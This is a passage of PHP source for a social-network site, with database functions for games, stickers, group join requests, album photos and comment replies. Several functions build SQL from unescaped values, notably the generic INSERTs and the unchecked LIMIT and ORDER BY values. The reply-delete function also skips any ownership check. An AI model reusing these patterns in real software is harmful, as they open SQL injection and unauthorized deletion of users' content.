    }
    $query_one .= " ORDER BY `id` DESC";
    if (isset($limit) and !empty($limit)) {
        $query_one .= " LIMIT {$limit}";
    }
    $sql = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        while ($fetched_data = mysqli_fetch_assoc($sql)) {
            $fetched_data            = NRG_GameData($fetched_data["id"]);
            $fetched_data["players"] = NRG_CountGamePlayers($fetched_data["id"]);
            $data[]                  = $fetched_data;
        }
    }
    return $data;
}
function NRG_AddGame($data = array()) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($data)) {
        return false;
    }
    $fields = "`" . implode("`, `", array_keys($data)) . "`";
    $data   = '\'' . implode('\', \'', $data) . '\'';
    $query  = mysqli_query($sqlConnect, "INSERT INTO " . T_GAMES . " ({$fields}) VALUES ({$data})");
    if ($query) {
        return true;
    } else {
        return false;
    }
}
function NRG_GetAllGifts($limit = 5, $after = 0) {
    global $nrg, $sqlConnect;
    $data      = array();
    $query_one = " SELECT * FROM " . T_GIFTS;
    if (!empty($after) && is_numeric($after) && $after > 0) {
        $query_one .= " WHERE `id` < " . NRG_Secure($after);
    }
    $query_one .= " ORDER BY `id` DESC";
    if (isset($limit) and !empty($limit)) {
        $query_one .= " LIMIT {$limit}";
    }
    $sql = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        while ($fetched_data = mysqli_fetch_assoc($sql)) {
            $data[] = $fetched_data;
        }
    }
    return $data;
}
function NRG_GetAllStickers($limit = 5, $after = 0) {
    global $nrg, $sqlConnect;
    $data      = array();
    $query_one = " SELECT * FROM " . T_STICKERS;
    if (!empty($after) && is_numeric($after) && $after > 0) {
        $query_one .= " WHERE `id` < " . NRG_Secure($after);
    }
    $query_one .= " ORDER BY `id` DESC";
    if (isset($limit) and !empty($limit)) {
        $query_one .= " LIMIT {$limit}";
    }
    $sql = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        while ($fetched_data = mysqli_fetch_assoc($sql)) {
            $data[] = $fetched_data;
        }
    }
    return $data;
}
function NRG_IsPlayingGame($id) {
    global $nrg, $sqlConnect;
    $data = array();
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($id) or !is_numeric($id) or $id < 1) {
        return false;
    }
    $id      = NRG_Secure($id);
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    $query   = mysqli_query($sqlConnect, "SELECT COUNT(`id`) AS count FROM " . T_GAMES_PLAYERS . " WHERE `game_id` = {$id} AND `user_id` = {$user_id} AND `active` = '1' ");
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        if ($fetched_data["count"] > 0) {
            return true;
        }
    }
    return false;
}
function NRG_AddPlayGame($id) {
    global $nrg, $sqlConnect;
    $data = array();
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($id) or !is_numeric($id) or $id < 1) {
        return false;
    }
    $id      = NRG_Secure($id);
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    $time    = time();
    if (NRG_IsPlayingGame($id) === true) {
        $query_one = mysqli_query($sqlConnect, "UPDATE " . T_GAMES_PLAYERS . " set `last_play` = {$time} WHERE `game_id` = {$id} AND `user_id` = {$user_id}");
        return false;
    }
    $query_one = mysqli_query($sqlConnect, "INSERT INTO " . T_GAMES_PLAYERS . " (`game_id`, `user_id`, `active`, `last_play`) VALUES ({$id}, {$user_id}, '1', {$time})");
    if ($query_one) {
        return true;
    }
}
function NRG_CountGamePlayers($id) {
    global $nrg, $sqlConnect;
    $data = array();
    if (empty($id) or !is_numeric($id) or $id < 1) {
        return false;
    }
    $id    = NRG_Secure($id);
    $query = mysqli_query($sqlConnect, "SELECT COUNT(`id`) AS count FROM " . T_GAMES_PLAYERS . " WHERE `game_id` = {$id} AND `active` = '1'");
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_GetMyGames($limit = 0, $offset = 0) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $data    = array();
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    $offset_ = "";
    if (!empty($offset) && is_numeric($offset) && $offset > 0) {
        $offset_ .= " AND `id` < " . NRG_Secure($offset);
    }
    $limit_ = "";
    if (!empty($limit)) {
        $limit  = NRG_Secure($limit);
        $limit_ = " LIMIT {$limit}";
    }
    $query_text = "SELECT `game_id`,`id` FROM " . T_GAMES_PLAYERS . " WHERE `user_id` = {$user_id} $offset_ ORDER BY `last_play` DESC $limit_";
    $query_one  = mysqli_query($sqlConnect, $query_text);
    if (mysqli_num_rows($query_one)) {
        while ($fetched_data = mysqli_fetch_assoc($query_one)) {
            if (is_array($fetched_data)) {
                $game_data              = NRG_GameData($fetched_data["game_id"]);
                $game_data["offset_id"] = $fetched_data["id"];
                $data[]                 = $game_data;
            }
        }
    }
    return $data;
}
function NRG_IsNameExist($username, $active = 0) {
    global $nrg, $sqlConnect;
    $data = array();
    if (empty($username)) {
        return false;
    }
    $named_files = array(
        "video-call",
        "video-call-api",
        "confirm-sms",
        "confirm-sms-password",
        "forgot-password",
        "reset-password",
        "start-up",
        "pages",
        "suggested-pages",
        "liked-pages",
        "go-pro",
        "groups",
        "suggested-groups",
        "create-group",
        "group-setting",
        "create-page",
        "page-setting",
        "post",
        "new-game",
        "saved-posts",
        "albums",
        "create-album",
        "contact-us",
        "user-activation",
        "boosted-pages",
        "boosted-posts",
        "new-product",
        "edit-product",
        "my-products",
        "site-pages",
        "blogs",
        "my-blogs",
        "create-blog",
        "read-blog",
        "edit-blog",
        "blog-category",
        "forum-members",
        "forum-members-byname",
        "forum-events",
        "forum-search",
        "forum-search-result",
        "forum-help",
        "forums",
        "forumaddthred",
        "showthread",
        "threadreply",
        "threadquote",
        "editreply",
        "deletereply",
        "mythreads",
        "mymessages",
        "edithread",
        "deletethread",
        "create-event",
        "edit-event",
        "events",
        "events-going",
        "events-interested",
        "events-past",
        "show-event",
        "events-invited",
        "my-events",
        "app-setting",
        "create-app",
        "app",
        "movies-genre",
        "movies-country",
        "watch-film",
        "advertise",
        "create-ads",
        "edit-ads",
        "chart-ads",
        "manage-ads",
        "create-status",
        "friends-nearby",
        "more-status",
        "my-dgp-wallet",
        "leaderboard"
    );
    $files       = scandir("sources");
    unset($files[0]);
    unset($files[1]);
    if ($username != "admin" && (in_array($username . ".php", $files) || in_array($username, $files) || in_array($username, $named_files))) {
        return array(
            true,
            "type" => "file"
        );
    }
    $active_text = "";
    if ($active == 1) {
        $active_text = "AND `active` = '1'";
    }
    $username = NRG_Secure($username);
    $query    = mysqli_query($sqlConnect, "SELECT COUNT(`user_id`) as users,`user_id` as id FROM " . T_USERS . " WHERE `username` = '{$username}' {$active_text}");
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        if ($fetched_data["users"] == 1) {
            return array(
                true,
                "type" => "user",
                'id' => $fetched_data["id"]
            );
        }
    }
    $query = mysqli_query($sqlConnect, "SELECT COUNT(`page_id`) as pages,`page_id` as id FROM " . T_PAGES . " WHERE `page_name` = '{$username}' {$active_text}");
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        if ($fetched_data["pages"] == 1) {
            return array(
                true,
                "type" => "page",
                'id' => $fetched_data["id"]
            );
        }
    }
    ($query = mysqli_query($sqlConnect, "SELECT COUNT(`id`) as usergroups,`id` as id FROM " . T_GROUPS . " WHERE `group_name` = '{$username}' {$active_text}")) or die(mysqli_error($sqlConnect));
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        if ($fetched_data["usergroups"] > 0) {
            return array(
                true,
                "type" => "group",
                'id' => $fetched_data["id"]
            );
        }
    }
    return array(
        false
    );
}
function NRG_IsPhoneExist($phone) {
    global $nrg, $sqlConnect;
    $data = array();
    if (empty($phone)) {
        return false;
    }
    $phone      = NRG_Secure($phone);
    $query_text = "SELECT (SELECT COUNT(`user_id`) FROM " . T_USERS . " WHERE `phone_number` = '{$phone}') as users";
    $query      = mysqli_query($sqlConnect, $query_text);
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        if ($fetched_data["users"] == 1) {
            return array(
                true
            );
        } else {
            return array(
                false
            );
        }
    }
    return false;
}
function NRG_GetGroupRequests($group_id) {
    global $nrg, $sqlConnect;
    $data      = array();
    $group_id  = NRG_Secure($group_id);
    $user_id   = $nrg["user"]["user_id"];
    $query_one = " SELECT `user_id` FROM " . T_GROUP_MEMBERS . " WHERE `group_id` = {$group_id} AND `user_id` != {$user_id} AND `active` = '0' ORDER BY `id` DESC";
    $sql       = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        while ($fetched_data = mysqli_fetch_assoc($sql)) {
            $data[] = NRG_UserData($fetched_data["user_id"]);
        }
    }
    return $data;
}
function NRG_GetGroupRequestsWithOffset($request = array()) {
    global $nrg, $sqlConnect;
    if (empty($request) || !is_array($request) || empty($request["group_id"])) {
        return false;
    }
    $data         = array();
    $group_id     = NRG_Secure($request["group_id"]);
    $limit_query  = "";
    $offset_query = "";
    if (!empty($request["limit"])) {
        $limit_query = " LIMIT " . NRG_Secure($request["limit"]);
    }
    if (!empty($request["offset"])) {
        $offset_query = " AND `id` < '" . NRG_Secure($request["offset"]) . "' ";
    }
    $query_one = " SELECT `id`,`user_id` FROM " . T_GROUP_MEMBERS . " WHERE `group_id` = {$group_id} {$offset_query} AND `active` = '0' ORDER BY `id` DESC " . $limit_query;
    $sql       = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        while ($fetched_data = mysqli_fetch_assoc($sql)) {
            $new_data              = array();
            $new_data["id"]        = $fetched_data["id"];
            $new_data["user_data"] = NRG_UserData($fetched_data["user_id"]);
            $data[]                = $new_data;
        }
    }
    return $data;
}
function NRG_AcceptJoinRequest($user_id, $group_id) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (!isset($user_id) or empty($user_id) or !is_numeric($user_id) or $user_id < 1) {
        return false;
    }
    if (!isset($group_id) or empty($group_id) or !is_numeric($group_id) or $group_id < 1) {
        return false;
    }
    $group_id = NRG_Secure($group_id);
    $user_id  = NRG_Secure($user_id);
    if (NRG_IsGroupOnwer($group_id) === false) {
        return false;
    }
    if (NRG_IsJoinRequested($group_id, $user_id) === false) {
        return false;
    }
    if (NRG_IsGroupJoined($group_id, $user_id) === true) {
        return false;
    }
    $query     = "SELECT `id` FROM " . T_GROUP_MEMBERS . " WHERE `group_id` = {$group_id} AND `user_id` = {$user_id} AND `active` = '0'";
    $sql_query = mysqli_query($sqlConnect, $query);
    if (mysqli_num_rows($sql_query) == 0) {
        return false;
    }
    $query = mysqli_query($sqlConnect, "UPDATE " . T_GROUP_MEMBERS . " SET `active` = '1' WHERE `user_id` = {$user_id} AND `group_id` = {$group_id} AND `active` = '0'");
    if ($query) {
        $group                   = NRG_GroupData($group_id);
        $notification_data_array = array(
            "recipient_id" => $user_id,
            "notifier_id" => $group["user_id"],
            "type" => "accepted_join_request",
            "group_id" => $group_id,
            "url" => "index.php?link1=timeline&u=" . $group["group_name"]
        );
        NRG_RegisterNotification($notification_data_array);
        return true;
    }
}
function NRG_DeleteJoinRequest($user_id, $group_id) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (!isset($user_id) or empty($user_id) or !is_numeric($user_id) or $user_id < 1) {
        return false;
    }
    if (!isset($group_id) or empty($group_id) or !is_numeric($group_id) or $group_id < 1) {
        return false;
    }
    $group_id = NRG_Secure($group_id);
    $user_id  = NRG_Secure($user_id);
    if (NRG_IsGroupOnwer($group_id) === false) {
        return false;
    }
    if (NRG_IsJoinRequested($group_id, $user_id) === false) {
        return false;
    }
    if (NRG_IsGroupJoined($group_id, $user_id) === true) {
        return false;
    }
    $query     = "SELECT `id` FROM " . T_GROUP_MEMBERS . " WHERE `group_id` = {$group_id} AND `user_id` = {$user_id} AND `active` = '0'";
    $sql_query = mysqli_query($sqlConnect, $query);
    if (mysqli_num_rows($sql_query) == 0) {
        return false;
    }
    $query = mysqli_query($sqlConnect, "DELETE FROM " . T_GROUP_MEMBERS . " WHERE `user_id` = {$user_id} AND `group_id` = {$group_id} AND `active` = '0'");
    if ($query) {
        return true;
    }
}
function NRG_CountGroupRequests($group_id) {
    global $nrg, $sqlConnect;
    $data = array();
    if (empty($group_id) or !is_numeric($group_id) or $group_id < 1) {
        return false;
    }
    $group_id = NRG_Secure($group_id);
    $user_id  = $nrg["user"]["user_id"];
    $query    = mysqli_query($sqlConnect, "SELECT COUNT(`id`) AS count FROM " . T_GROUP_MEMBERS . " WHERE `group_id` = {$group_id} AND `user_id` != {$user_id} AND `active` = '0'");
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_RegisterAlbumMedia($id, $media, $parent_id = 0) {
    global $nrg, $sqlConnect;
    if (empty($id) or !is_numeric($id) or $id < 1) {
        return false;
    }
    if (empty($media)) {
        return false;
    }
    if (!empty($parent_id) && is_numeric($parent_id) && $parent_id > 0) {
        $parent_id = NRG_Secure($parent_id);
    }
    $query_one = mysqli_query($sqlConnect, "INSERT INTO " . T_ALBUMS_MEDIA . " (`post_id`,`image`,`parent_id`) VALUES ({$id}, '{$media}','{$parent_id}')");
    if ($query_one) {
        return true;
    }
}
function NRG_GetAlbumPhotos($post_id) {
    global $nrg, $sqlConnect;
    $data        = array();
    $post_id     = NRG_Secure($post_id);
    $query_one   = "SELECT `id`,`image`,`post_id`,`parent_id` FROM " . T_ALBUMS_MEDIA . " WHERE `post_id` = {$post_id} ORDER BY `id` DESC";
    $sql         = mysqli_query($sqlConnect, $query_one);
    $query_2     = "SELECT `id`,`image`,`post_id`,`parent_id` FROM " . T_ALBUMS_MEDIA . " WHERE `parent_id` = {$post_id} ORDER BY `id` DESC";
    $sql2        = mysqli_query($sqlConnect, $query_2);
    $images_data = array();
    if (mysqli_num_rows($sql2)) {
        while ($f_data = mysqli_fetch_assoc($sql2)) {
            $images_data[] = $f_data;
        }
    }
    if (mysqli_num_rows($sql)) {
        while ($fetched_data = mysqli_fetch_assoc($sql)) {
            foreach ($images_data as $key => $value) {
                if ($value["image"] == $fetched_data["image"]) {
                    $fetched_data["parent_id"] = $value["post_id"];
                }
            }
            $explode2                  = @end(explode(".", $fetched_data["image"]));
            $explode3                  = @explode(".", $fetched_data["image"]);
            $fetched_data["image_org"] = $explode3[0] . "_small." . $explode2;
            $fetched_data["image"]     = NRG_GetMedia($fetched_data["image"]);
            $data[]                    = $fetched_data;
        }
    }
    return $data;
}
function NRG_CountAlbumImages($post_id) {
    global $nrg, $sqlConnect;
    if (empty($post_id) || !is_numeric($post_id) || $post_id < 1) {
        return false;
    }
    $post_id   = NRG_Secure($post_id);
    $query_one = "SELECT COUNT(`id`) as count FROM " . T_ALBUMS_MEDIA . " WHERE `post_id` = {$post_id} ORDER BY `id` DESC";
    $sql       = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        $fetched_data = mysqli_fetch_assoc($sql);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_CountUserAlbums($user_id) {
    global $nrg, $sqlConnect;
    if (empty($user_id) || !is_numeric($user_id) || $user_id < 1) {
        return false;
    }
    $user_id   = NRG_Secure($user_id);
    $query_one = "SELECT COUNT(`id`) as count FROM " . T_POSTS . " WHERE `user_id` = {$user_id} AND `album_name` <> '' ORDER BY `id` DESC";
    $sql       = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        $fetched_data = mysqli_fetch_assoc($sql);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_DeleteImageFromAlbum($post_id, $id) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($post_id) || !is_numeric($post_id) || $post_id < 1) {
        return false;
    }
    if (empty($id) || !is_numeric($id) || $id < 1) {
        return false;
    }
    if (NRG_IsPostOnwer($post_id, $nrg["user"]["user_id"]) === false) {
        return false;
    }
    $id      = NRG_Secure($id);
    $post_id = NRG_Secure($post_id);
    $query_2 = mysqli_query($sqlConnect, "SELECT * FROM " . T_ALBUMS_MEDIA . " WHERE `post_id` = {$post_id} AND `id` = {$id}");
    if (mysqli_num_rows($query_2)) {
        $fetched_data = mysqli_fetch_assoc($query_2);
        $image        = $fetched_data["image"];
        $query        = mysqli_query($sqlConnect, "SELECT * FROM " . T_ALBUMS_MEDIA . " WHERE `parent_id` = {$post_id} AND `image` LIKE '%{$image}%'");
        if (mysqli_num_rows($query)) {
            $fetched_data_2 = mysqli_fetch_assoc($query);
            $delete_post    = NRG_DeletePost($fetched_data_2["post_id"]);
            mysqli_query($sqlConnect, "DELETE FROM " . T_ALBUMS_MEDIA . " WHERE `parent_id` = {$post_id} AND `image` LIKE '%{$image}%'");
        }
        $explode2 = @end(explode(".", $fetched_data["image"]));
        $explode3 = @explode(".", $fetched_data["image"]);
        $media_2  = $explode3[0] . "_small." . $explode2;
        @unlink(trim($media_2));
        @unlink($fetched_data["image"]);
        $delete_from_s3 = NRG_DeleteFromToS3($media_2);
        $delete_from_s3 = NRG_DeleteFromToS3($fetched_data["image"]);
    }
    $delete_query_2 = mysqli_query($sqlConnect, "SELECT `post_id` FROM " . T_ALBUMS_MEDIA . " WHERE `post_id` = {$post_id}");
    if (mysqli_num_rows($delete_query_2) == 1) {
        $delete_post = NRG_DeletePost($post_id);
    }
    $delete_query = mysqli_query($sqlConnect, "DELETE FROM " . T_ALBUMS_MEDIA . " WHERE `post_id` = {$post_id} AND `id` = {$id}");
    if ($delete_query) {
        $delete_query_2 = mysqli_query($sqlConnect, "SELECT `id` FROM " . T_ALBUMS_MEDIA . " WHERE `post_id` = {$post_id}");
        if (mysqli_num_rows($delete_query_2) == 0) {
            $delete_post = NRG_DeletePost($post_id);
        }
        return true;
    }
}
function NRG_AlbumImageData($data = array()) {
    global $nrg, $sqlConnect;
    if (!empty($data["id"])) {
        if (is_numeric($data["id"])) {
            $id = NRG_Secure($data["id"]);
        }
    }
    $order_by = "";
    if (!empty($data["after_image_id"]) && is_numeric($data["after_image_id"])) {
        $data["after_image_id"] = NRG_Secure($data["after_image_id"]);
        $subquery               = " `id` <> " . $data["after_image_id"] . " AND `id` < " . $data["after_image_id"];
        $order_by               = "DESC";
    } elseif (!empty($data["before_image_id"]) && is_numeric($data["before_image_id"])) {
        $data["before_image_id"] = NRG_Secure($data["before_image_id"]);
        $subquery                = " `id` <> " . $data["before_image_id"] . " AND `id` > " . $data["before_image_id"];
        $order_by                = "ASC";
    } else {
        $subquery = " `id` = '{$id}'";
    }
    if (!empty($data["post_id"]) && is_numeric($data["post_id"])) {
        $data["post_id"] = NRG_Secure($data["post_id"]);
        $subquery .= " AND `post_id` = " . $data["post_id"];
    }
    $query_one = "SELECT * FROM " . T_ALBUMS_MEDIA . " WHERE $subquery ORDER by `id` {$order_by}";
    $sql       = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        $fetched_data = mysqli_fetch_assoc($sql);
        if (!empty($fetched_data)) {
            $fetched_data["image_org"] = NRG_GetMedia($fetched_data["image"]);
        }
        return $fetched_data;
    }
    return false;
}
function NRG_GetCommentReplies($comment_id = 0, $limit = 5, $order_by = "ASC") {
    global $sqlConnect, $nrg;
    if (empty($comment_id) || !is_numeric($comment_id) || $comment_id < 0) {
        return false;
    }
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $logged_user_id = NRG_Secure($nrg["user"]["user_id"]);
    $comment_id     = NRG_Secure($comment_id);
    $data           = array();
    $query          = "SELECT `id` FROM " . T_COMMENTS_REPLIES . " WHERE `comment_id` = {$comment_id} AND `user_id` NOT IN (SELECT `blocked` FROM " . T_BLOCKS . " WHERE `blocker` = '{$logged_user_id}') AND `user_id` NOT IN (SELECT `blocker` FROM " . T_BLOCKS . " WHERE `blocked` = '{$logged_user_id}') ORDER BY `id` {$order_by}";
    if (($comments_num = NRG_CountCommentReplies($comment_id)) > $limit) {
        $query .= " LIMIT " . ($comments_num - $limit) . ", {$limit} ";
    }
    $query_one = mysqli_query($sqlConnect, $query);
    if (mysqli_num_rows($query_one)) {
        while ($fetched_data = mysqli_fetch_assoc($query_one)) {
            $data[] = NRG_GetCommentReply($fetched_data["id"]);
        }
    }
    return $data;
}
function NRG_GetCommentReply($reply_id = 0) {
    global $nrg, $sqlConnect;
    if (empty($reply_id) || !is_numeric($reply_id) || $reply_id < 0) {
        return false;
    }
    $reply_id  = NRG_Secure($reply_id);
    $query_one = mysqli_query($sqlConnect, "SELECT * FROM " . T_COMMENTS_REPLIES . " WHERE `id` = {$reply_id} ");
    if (mysqli_num_rows($query_one)) {
        $fetched_data = mysqli_fetch_assoc($query_one);
        if (!empty($fetched_data["page_id"])) {
            $fetched_data["publisher"] = NRG_PageData($fetched_data["page_id"]);
            $fetched_data["url"]       = NRG_SeoLink("index.php?link1=timeline&u=" . $fetched_data["publisher"]["page_name"]);
            if ($fetched_data["publisher"]["user_id"] != $fetched_data["user_id"] && !NRG_IsPageAdminExists($fetched_data["user_id"], $fetched_data["page_id"])) {
                $fetched_data["publisher"] = NRG_UserData($fetched_data["user_id"]);
                $fetched_data["url"]       = NRG_SeoLink("index.php?link1=timeline&u=" . $fetched_data["publisher"]["username"]);
            }
        } else {
            $fetched_data["publisher"] = NRG_UserData($fetched_data["user_id"]);
            $fetched_data["url"]       = NRG_SeoLink("index.php?link1=timeline&u=" . $fetched_data["publisher"]["username"]);
        }
        $fetched_data["Orginaltext"]         = NRG_EditMarkup($fetched_data["text"], true, true, true, 0, 0, $reply_id);
        $fetched_data["Orginaltext"]         = str_replace("<br>", "\n", $fetched_data["Orginaltext"]);
        $fetched_data["text"]                = NRG_Markup($fetched_data["text"], true, true, true, 0, 0, $reply_id);
        $fetched_data["text"]                = NRG_Emo($fetched_data["text"]);
        $fetched_data["onwer"]               = false;
        $fetched_data["post_onwer"]          = false;
        $fetched_data["comment_likes"]       = NRG_CountCommentReplyLikes($fetched_data["id"]);
        $fetched_data["comment_wonders"]     = NRG_CountCommentReplyWonders($fetched_data["id"]);
        $fetched_data["is_comment_wondered"] = false;
        $fetched_data["is_comment_liked"]    = false;
        if ($nrg["loggedin"] == true) {
            $fetched_data["onwer"]               = $fetched_data["publisher"]["user_id"] == $nrg["user"]["user_id"] ? true : false;
            $fetched_data["is_comment_wondered"] = NRG_IsCommentReplyWondered($fetched_data["id"], $nrg["user"]["user_id"]) ? true : false;
            $fetched_data["is_comment_liked"]    = NRG_IsCommentReplyLiked($fetched_data["id"], $nrg["user"]["user_id"]) ? true : false;
        }
        if ($nrg["config"]["second_post_button"] == "reaction") {
            $fetched_data["reaction"] = NRG_GetPostReactionsTypes($fetched_data["id"], "replay");
        }
        return $fetched_data;
    }
    return false;
}
function NRG_CountCommentReplies($comment_id = "") {
    global $sqlConnect;
    if (empty($comment_id) || !is_numeric($comment_id) || $comment_id < 0) {
        return false;
    }
    $comment_id = NRG_Secure($comment_id);
    $query      = mysqli_query($sqlConnect, "SELECT COUNT(`id`) AS `replies` FROM " . T_COMMENTS_REPLIES . " WHERE `comment_id` = {$comment_id} ");
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        return $fetched_data["replies"];
    }
    return false;
}
function NRG_DeleteCommentReply($comment_id = "") {
    global $nrg, $sqlConnect;
    if ($comment_id < 0 || empty($comment_id) || !is_numeric($comment_id)) {
        return false;
    }
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $comment_id   = NRG_Secure($comment_id);
    $query_delete = mysqli_query($sqlConnect, "DELETE FROM " . T_COMMENTS_REPLIES . " WHERE `id` = {$comment_id}");
    $query_delete .= mysqli_query($sqlConnect, "DELETE FROM " . T_COMMENT_REPLIES_WONDERS . " WHERE `reply_id` = {$comment_id}");
    $query_delete .= mysqli_query($sqlConnect, "DELETE FROM " . T_COMMENT_REPLIES_LIKES . " WHERE `reply_id` = {$comment_id}");
    $query_delete .= mysqli_query($sqlConnect, "DELETE FROM " . T_REACTIONS . " WHERE `replay_id` = '{$comment_id}'");
    if ($query_delete) {
        return true;
    }
}
function NRG_RegisterCommentReply($data = array()) {
    global $sqlConnect, $nrg, $db;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($data["comment_id"]) || !is_numeric($data["comment_id"]) || $data["comment_id"] < 0) {
        return false;
    }
    if (empty($data["text"]) && empty($data["c_file"])) {
        return false;
    }
    if (empty($data["user_id"]) || !is_numeric($data["user_id"]) || $data["user_id"] < 0) {
        return false;
    }
    if (!empty($data["page_id"])) {
        if (NRG_IsPageOnwer($data["page_id"]) === false) {
            $data["page_id"] = 0;
        }
    }
    if (!empty($data["text"])) {
        if ($nrg["config"]["maxCharacters"] > 0) {
            if (strlen($data["text"]) > $nrg["config"]["maxCharacters"]) {
                return false;
            }
        }
        $link_regex = "/(http\:\/\/|https\:\/\/|www\.)([^\ ]+)/i";
        $i          = 0;
        preg_match_all($link_regex, $data["text"], $matches);
        foreach ($matches[0] as $match) {
            $match_url    = strip_tags($match);
            $syntax       = "[a]" . urlencode($match_url) . "[/a]";
            $data["text"] = str_replace($match, $syntax, $data["text"]);
        }
        $mention_regex = "/@([A-Za-z0-9_]+)/i";
        preg_match_all($mention_regex, $data["text"], $matches);
        foreach ($matches[1] as $match) {
            $match         = NRG_Secure($match);
            $match_user    = NRG_UserData(NRG_UserIdFromUsername($match));
            $match_search  = "@" . $match;
            $match_replace = "@[" . $match_user["user_id"] . "]";
            if (isset($match_user["user_id"])) {
                $data["text"] = str_replace($match_search, $match_replace, $data["text"]);
                $mentions[]   = $match_user["user_id"];
            }
        }
    }
    $hashtag_regex = '/#([^`~!@$%^&*\#()\-+=\\|\/\.,<>?\'\":;{}\[\]* ]+)/i';
    preg_match_all($hashtag_regex, $data["text"], $matches);
    foreach ($matches[1] as $match) {
        if (!is_numeric($match)) {
            $hashdata = NRG_GetHashtag($match);
            if (is_array($hashdata)) {
                $match_search  = "#" . $match;
                $match_replace = "#[" . $hashdata["id"] . "]";
                $data["text"]  = str_replace($match_search, $match_replace, $data["text"]);
                // $hashtag_query     = "UPDATE " . T_HASHTAGS . " SET `last_trend_time` = " . time() . ", `trend_use_num` = " . ($hashdata['trend_use_num'] + 1) . " WHERE `id` = " . $hashdata['id'];
                // $hashtag_sql_query = mysqli_query($sqlConnect, $hashtag_query);
            }
        }
    }
    $comment = NRG_GetPostComment($data["comment_id"]);
    $text    = "";
    $type2   = "";
    $page_id = "";
    if (!empty($data["page_id"]) && $data["page_id"] > 0) {
        $page_id = $data["page_id"];
    }
    if (isset($comment["text"]) && !empty($comment["text"])) {
        $text = substr($comment["text"], 0, 10) . "..";
    }
    $user_id = NRG_GetUserIdFromCommentId($data["comment_id"]);
    if (empty($user_id)) {
        $user_id = NRG_GetUserIdFromPageId($comment["page_id"]);
        if (empty($user_id)) {
            return false;
        }
    }
    if (!empty($page_id)) {
        $user_id = "";
    }
    if (empty($data["page_id"])) {
        $data["page_id"] = 0;
    }
    $fields                   = "`" . implode("`, `", array_keys($data)) . "`";
    $comment_data             = '\'' . implode('\', \'', $data) . '\'';
    $check_if_comment_is_spam = $db->where("text", $data["text"])->where("time", time() - 3600, ">")->getValue(T_COMMENTS_REPLIES, "COUNT(*)");
    if ($check_if_comment_is_spam >= 5) {
        return false;
    }
    $check_last_comment_exists = $db->where("text", $data["text"])->where("user_id", $data["user_id"])->where("comment_id", $data["comment_id"])->getValue(T_COMMENTS_REPLIES, "COUNT(*)");
    if ($check_last_comment_exists >= 2) {
        return false;
    }
    $query = mysqli_query($sqlConnect, "INSERT INTO  " . T_COMMENTS_REPLIES . " ({$fields}) VALUES ({$comment_data})");
    if ($query) {
        $inserted_reply_id = mysqli_insert_id($sqlConnect);
        $post_data         = NRG_PostData($comment["post_id"]);
        if ($nrg["config"]["shout_box_system"] == 1 && !empty($post_data) && $post_data["postPrivacy"] == 4 && $post_data["user_id"] == $data["user_id"]) {
            $type2 = "anonymous";
        }
        $notification_data_array = array(
            "recipient_id" => $user_id,
            "page_id" => $page_id,
            "post_id" => $comment["post_id"],
            "type" => "comment_reply",
            "text" => $text,
            "type2" => $type2,
            "url" => "index.php?link1=post&id=" . $comment["post_id"] . "&ref=" . $comment["id"]
        );
        NRG_RegisterNotification($notification_data_array);
        if (isset($mentions) && is_array($mentions)) {
            foreach ($mentions as $mention) {
                $notification_data_array = array(
                    "recipient_id" => $mention,
                    "type" => "comment_reply_mention",
                    "post_id" => $comment["post_id"],
                    "text" => $text,
                    "type2" => $type2,
                    "page_id" => $page_id,
                    "url" => "index.php?link1=post&id=" . $comment["post_id"] . "&ref=" . $comment["id"]
                );
                NRG_RegisterNotification($notification_data_array);
            }
        }
        $also = array();
        if (!empty($user_id)) {
            $also = NRG_GetRepliedUsers($data["comment_id"]);
            if (isset($also) && is_array($also)) {
                foreach ($also as $user) {
                    $notification_data_array = array(
                        "recipient_id" => $user["user_id"],
                        "type" => "also_replied",
                        "post_id" => $comment["post_id"],
                        "text" => $text,
                        "type2" => $type2,
                        "url" => "index.php?link1=post&id=" . $comment["post_id"] . "&ref=" . $comment["id"]
                    );
                    NRG_RegisterNotification($notification_data_array);
                }
            }
        }
        return $inserted_reply_id;
    }
}
function NRG_IsCommentOnwer($user_id, $comment_id) {
    global $sqlConnect;
    if (empty($comment_id) or !is_numeric($comment_id) or $comment_id < 1) {
        return false;
    }
    if (empty($user_id) or !is_numeric($user_id) or $user_id < 1) {
